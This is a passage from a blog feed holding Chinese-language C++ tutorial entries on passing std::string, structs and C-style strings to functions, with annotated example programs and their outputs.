create_greeting(user_name);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Hello, Alice!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然看起来这里也涉及复制（返回 <code>result</code> 的副本），但现代 C++ 编译器通常会应用<strong>返回值优化 (RVO)</strong> 或**命名返回值优化 (NRVO)**。这些优化可以避免在返回 <code>string</code>（或其他对象）时进行实际的复制，使得按值返回 <code>std::string</code> 非常高效。</p><p><strong>与 C-风格字符串的比较:</strong></p><p>使用 <code>std::string</code> 对象与函数交互比使用 C-风格字符串 (<code>char*</code>) 简单得多：</p><ul><li>  不需要担心空字符 <code>\0</code>。</li><li>  不需要手动管理内存（<code>new</code>/<code>delete[]</code>）。</li><li>  不需要单独传递大小（<code>string</code> 对象知道自己的大小）。</li><li>  按引用（尤其是常量引用）传递避免了复制开销，同时保持了代码的清晰和安全。</li><li>  返回值优化使得按值返回 <code>string</code> 通常很高效。</li></ul><p>因此，在现代 C++ 中，强烈推荐使用 <code>std::string</code> 而不是 C-风格字符串来处理文本数据。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.6 函数和结构</title>
      <link href="2025/04/26/7.6_%E5%87%BD%E6%95%B0%E5%92%8C%E7%BB%93%E6%9E%84/"/>
      <url>2025/04/26/7.6_%E5%87%BD%E6%95%B0%E5%92%8C%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>结构 (struct) 是一种用户定义的复合类型，可以将不同类型的数据项组合成一个单一的实体。与基本数据类型一样，结构也可以作为参数传递给函数，并且函数也可以返回结构类型的值。</p><h2 id="7-6-1-传递和返回结构"><a href="#7-6-1-传递和返回结构" class="headerlink" title="7.6.1 传递和返回结构"></a>7.6.1 传递和返回结构</h2><p>默认情况下，结构与基本数据类型（如 <code>int</code>, <code>double</code>）一样，是<strong>按值传递 (Pass by Value)</strong> 给函数的。这意味着当将一个结构变量作为实参传递给函数时，函数会创建该结构的一个完整<strong>副本</strong>（形参），并在函数内部操作这个副本。对副本成员的任何修改都不会影响原始结构变量。</p><p>同样，函数也可以声明一个结构类型作为其<strong>返回类型</strong>。当函数返回一个结构时，它会创建一个该结构的临时副本，并将其返回给调用者。</p><p><strong>示例：按值传递和返回结构</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 使用 string 类成员</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个简单的结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：按值接收 Point 结构，并打印其坐标</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_point</span><span class="params">(Point p)</span> </span>&#123; <span class="comment">// p 是 pt_main 的副本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying Point (inside function): (&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 修改副本的值，不会影响原始结构</span></span><br><span class="line">    p.x = <span class="number">100.0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified copy inside function: (&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：创建一个新的 Point 结构并按值返回</span></span><br><span class="line"><span class="function">Point <span class="title">create_point</span><span class="params">(<span class="keyword">double</span> x_val, <span class="keyword">double</span> y_val)</span> </span>&#123;</span><br><span class="line">    Point new_p;</span><br><span class="line">    new_p.x = x_val;</span><br><span class="line">    new_p.y = y_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating Point (&quot;</span> &lt;&lt; new_p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; new_p.y &lt;&lt; <span class="string">&quot;) inside create_point.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> new_p; <span class="comment">// 返回 Point 结构的副本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Point pt_main = &#123;<span class="number">3.0</span>, <span class="number">4.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling display_point: (&quot;</span> &lt;&lt; pt_main.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_main.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 按值传递 pt_main</span></span><br><span class="line">    display_point(pt_main);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling display_point: (&quot;</span> &lt;&lt; pt_main.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_main.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始结构未改变</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling create_point...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 接收函数返回的 Point 结构副本</span></span><br><span class="line">    Point pt_returned = create_point(<span class="number">5.5</span>, <span class="number">-1.2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Returned Point in main: (&quot;</span> &lt;&lt; pt_returned.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; pt_returned.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Before calling display_point: (3, 4)</span><br><span class="line">Displaying Point (inside function): (3, 4)</span><br><span class="line">Modified copy inside function: (100, 4)</span><br><span class="line">After calling display_point: (3, 4)</span><br><span class="line"></span><br><span class="line">Calling create_point...</span><br><span class="line">Creating Point (5.5, -1.2) inside create_point.</span><br><span class="line">Returned Point in main: (5.5, -1.2)</span><br></pre></td></tr></table></figure><p><strong>按值传递的优缺点:</strong></p><ul><li>  <strong>优点:</strong> 保护原始数据不被函数修改，概念简单。</li><li>  <strong>缺点:</strong> 对于包含大量数据成员的结构，复制整个结构可能效率低下，消耗时间和内存。</li></ul><h2 id="7-6-2-另一个处理结构的函数示例"><a href="#7-6-2-另一个处理结构的函数示例" class="headerlink" title="7.6.2 另一个处理结构的函数示例"></a>7.6.2 另一个处理结构的函数示例</h2><p>假设我们需要一个函数来计算两个点之间的中点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：计算两个 Point 的中点，并返回一个新的 Point</span></span><br><span class="line"><span class="function">Point <span class="title">find_midpoint</span><span class="params">(Point p1, Point p2)</span> </span>&#123;</span><br><span class="line">    Point midpoint;</span><br><span class="line">    midpoint.x = (p1.x + p2.x) / <span class="number">2.0</span>;</span><br><span class="line">    midpoint.y = (p1.y + p2.y) / <span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">return</span> midpoint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助函数：打印 Point (按值传递)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_point</span><span class="params">(Point p)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Point start_point = &#123;<span class="number">1.0</span>, <span class="number">1.0</span>&#125;;</span><br><span class="line">    Point end_point = &#123;<span class="number">5.0</span>, <span class="number">7.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Start point: &quot;</span>;</span><br><span class="line">    print_point(start_point);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End point: &quot;</span>;</span><br><span class="line">    print_point(end_point);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数计算中点</span></span><br><span class="line">    Point mid = find_midpoint(start_point, end_point);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Midpoint: &quot;</span>;</span><br><span class="line">    print_point(mid); <span class="comment">// 输出: (3, 4)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子再次展示了按值传递结构（<code>p1</code>, <code>p2</code> 是副本）和按值返回结构（<code>midpoint</code> 的副本被返回）。</p><h2 id="7-6-3-传递结构的地址"><a href="#7-6-3-传递结构的地址" class="headerlink" title="7.6.3 传递结构的地址"></a>7.6.3 传递结构的地址</h2><p>为了避免复制整个结构的开销，特别是当结构很大时，或者当需要函数能够修改原始结构时，可以传递结构的<strong>地址</strong>（即指向结构的指针）而不是结构本身。</p><p><strong>方法:</strong></p><ol><li> <strong>函数参数:</strong> 声明为指向结构类型的指针 (<code>struct_type*</code>)。</li><li> <strong>函数调用:</strong> 使用地址运算符 <code>&amp;</code> 获取结构变量的地址传递给函数。</li><li> <strong>访问成员:</strong> 在函数内部，需要使用<strong>间接成员访问运算符 <code>-&gt;</code></strong> (箭头运算符) 来访问指针指向的结构的成员。或者，先解引用指针 <code>*ptr</code>，然后再使用点运算符 <code>.</code>，即 <code>(*ptr).member</code>。<code>ptr-&gt;member</code> 是 <code>(*ptr).member</code> 的简洁写法。</li></ol><p><strong>示例：按指针传递结构</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Rectangle</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> width;</span><br><span class="line">    <span class="keyword">double</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：接收指向 Rectangle 的指针，计算面积</span></span><br><span class="line"><span class="comment">// 使用 const 表示函数不会通过指针修改结构内容</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">calculate_area</span><span class="params">(<span class="keyword">const</span> Rectangle* rect_ptr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 检查空指针是一种好的防御性编程习惯</span></span><br><span class="line">    <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Null pointer passed to calculate_area.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 使用箭头运算符 -&gt; 访问成员</span></span><br><span class="line">    <span class="keyword">return</span> rect_ptr-&gt;width * rect_ptr-&gt;height;</span><br><span class="line">    <span class="comment">// 或者使用 (*rect_ptr).width * (*rect_ptr).height</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：接收指向 Rectangle 的指针，并修改其尺寸 (放大)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_rectangle</span><span class="params">(Rectangle* rect_ptr, <span class="keyword">double</span> factor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span> || factor &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Invalid arguments for scale_rectangle.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rect_ptr-&gt;width *= factor;  <span class="comment">// 修改原始结构</span></span><br><span class="line">    rect_ptr-&gt;height *= factor; <span class="comment">// 修改原始结构</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助函数：打印 Rectangle (按指针传递，使用 const)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_rectangle</span><span class="params">(<span class="keyword">const</span> Rectangle* rect_ptr)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rectangle [Width=&quot;</span> &lt;&lt; rect_ptr-&gt;width &lt;&lt; <span class="string">&quot;, Height=&quot;</span> &lt;&lt; rect_ptr-&gt;height &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Rectangle box = &#123;<span class="number">10.0</span>, <span class="number">5.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original Box: &quot;</span>;</span><br><span class="line">    print_rectangle(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 传递 box 的地址给 calculate_area</span></span><br><span class="line">    <span class="keyword">double</span> area = calculate_area(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; area &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 50</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 传递 box 的地址给 scale_rectangle 以修改它</span></span><br><span class="line">    scale_rectangle(&amp;box, <span class="number">2.0</span>); <span class="comment">// 放大两倍</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scaled Box: &quot;</span>;</span><br><span class="line">    print_rectangle(&amp;box); <span class="comment">// 打印修改后的原始 box</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Rectangle [Width=20, Height=10]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重新计算面积</span></span><br><span class="line">    area = calculate_area(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Area: &quot;</span> &lt;&lt; area &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>按指针传递的优缺点:</strong></p><ul><li><strong>优点:</strong><ul><li>  效率高，只传递地址，不复制整个结构。</li><li>  允许函数修改原始结构数据。</li></ul></li><li><strong>缺点:</strong><ul><li>  语法稍复杂（需要使用 <code>&amp;</code> 获取地址，使用 <code>-&gt;</code> 或 <code>(*).</code> 访问成员）。</li><li>  可能意外修改原始数据（除非使用 <code>const</code>）。</li><li>  需要处理空指针的可能性。</li></ul></li></ul><p><strong>按引用传递 (Pass by Reference):</strong></p><p>C++ 还提供了另一种避免复制并允许修改原始数据的方式：<strong>按引用传递</strong>。这将在第 8 章详细介绍。按引用传递通常比按指针传递更简洁、更安全（因为它通常不涉及空引用的概念）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：按引用传递 (将在第 8 章详细讲解)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Circle</span> &#123;</span> <span class="keyword">double</span> radius; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是 Circle 的引用 (别名)</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">circle_area_ref</span><span class="params">(<span class="keyword">const</span> Circle&amp; c)</span> </span>&#123; <span class="comment">// 使用 const 引用避免复制且不修改</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">3.14159</span> * c.radius * c.radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_circle_ref</span><span class="params">(Circle&amp; c, <span class="keyword">double</span> factor)</span> </span>&#123; <span class="comment">// 使用非 const 引用允许修改</span></span><br><span class="line">    <span class="keyword">if</span> (factor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        c.radius *= factor; <span class="comment">// 直接用 . 访问成员，修改原始对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Circle circ = &#123;<span class="number">5.0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; circle_area_ref(circ) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    scale_circle_ref(circ, <span class="number">3.0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Radius: &quot;</span> &lt;&lt; circ.radius &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Area: &quot;</span> &lt;&lt; circle_area_ref(circ) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  结构默认按值传递给函数（创建副本）。</li><li>  函数可以按值返回结构（返回副本）。</li><li>  为提高效率或允许修改原始结构，可以传递结构的地址（指针 <code>struct_type*</code>），使用 <code>-&gt;</code> 访问成员。</li><li>  使用 <code>const</code> 配合指针（或引用）可以防止函数意外修改结构。</li><li>  按引用传递 (<code>struct_type&amp;</code>) 是另一种常用的高效传递方式，通常更受欢迎。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.5 函数和 C-风格字符串</title>
      <link href="2025/04/26/7.5_%E5%87%BD%E6%95%B0%E5%92%8CC-%E9%A3%8E%E6%A0%BC%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>2025/04/26/7.5_%E5%87%BD%E6%95%B0%E5%92%8CC-%E9%A3%8E%E6%A0%BC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p>C-风格字符串本质上是字符数组 (<code>char[]</code>)，其末尾有一个特殊的空字符 (<code>\0</code>) 来标记字符串的结束。因此，将 C-风格字符串传递给函数遵循与传递普通数组相同的规则：传递的是指向字符串第一个字符的指针 (<code>char*</code>)。</p><p>函数不需要单独的参数来指定字符串的长度，因为它可以遍历字符序列直到遇到空字符 <code>\0</code> 来确定字符串的结束。</p><h2 id="7-5-1-将-C-风格字符串作为参数的函数"><a href="#7-5-1-将-C-风格字符串作为参数的函数" class="headerlink" title="7.5.1 将 C-风格字符串作为参数的函数"></a>7.5.1 将 C-风格字符串作为参数的函数</h2><p>当函数接收 C-风格字符串作为参数时，通常使用 <code>char*</code> 或 <code>const char*</code> 类型。如果函数不打算修改字符串内容，强烈建议使用 <code>const char*</code>，这可以防止意外修改，并允许函数接受字符串字面值（它们是常量）和 <code>const</code> 字符数组作为参数。</p><p><strong>示例 1: 计算 C-风格字符串的长度</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：计算 C 风格字符串的长度</span></span><br><span class="line"><span class="comment">// 使用 const char* 因为我们不修改字符串</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">string_length</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 循环直到遇到空字符 &#x27;\0&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> (*str != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        length++;</span><br><span class="line">        str++; <span class="comment">// 移动指针到下一个字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> greeting[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* message = <span class="string">&quot;World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;&quot;</span> &lt;&lt; greeting &lt;&lt; <span class="string">&quot;\&quot;: &quot;</span> &lt;&lt; string_length(greeting) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;: &quot;</span> &lt;&lt; string_length(message) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出: 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;C++\&quot;: &quot;</span> 